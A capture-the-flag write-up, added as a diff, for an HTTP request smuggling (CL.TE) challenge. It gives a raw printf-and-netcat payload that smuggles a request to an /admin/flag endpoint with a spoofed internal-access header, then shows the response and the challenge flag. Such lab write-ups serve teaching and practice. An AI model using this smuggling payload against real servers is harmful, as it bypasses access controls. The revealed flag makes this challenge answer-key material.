@@ -1,0 +1,44 @@
+Topic: HTTP Request Smuggling(CL.TE)
+
+Description: You are a spy an Indian spy in Pakistan who wants to send an encoded message to India. In order to communicate via the safeline you need to get access to its key.
+Find the key to send messages to India.
+
+Hint 1: Exploit the disagreement of opinions between the two nations. There can be different consequences depending on what two different people believe.
+
+Hint 2: Some tools send requests line by line instead of helping you format them.
+The gateway behaves differently when spoken to at the TCP level.
+
+Solution:
+Solved using netcat.
+
+This is a classic HTTP Request Smuggling problem where the frontend trusts the Content-Length header and the backend trusts the Transfer-Encoding: chunked header.
+By sending both headers, we can cause a request desynchronization between the two components.
+
+This allows us to sneak a second HTTP request to the backend inside the body of the first request.
+
+Netcat allows us to send raw TCP payloads, which is required for HTTP smuggling.
+
+Exploit Payload
+printf "POST /submit HTTP/1.1\r\n\
+Host: localhost\r\n\
+Content-Length: 5\r\n\
+Transfer-Encoding: chunked\r\n\
+\r\n\
+0\r\n\
+\r\n\
+GET /admin/flag HTTP/1.1\r\n\
+Host: localhost\r\n\
+X-Internal-Access: true\r\n\
+\r\n" | nc 127.0.0.1 9000
+
+The resulting raw response will look something like this:
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+OKHTTP/1.1 200 OK
+Content-Type: text/plain
+
+CultRang{5om3tim3s_5muggl1ng_i5_G00d}
+
+Flag: CultRang{5om3tim3s_5muggl1ng_i5_G00d}
+
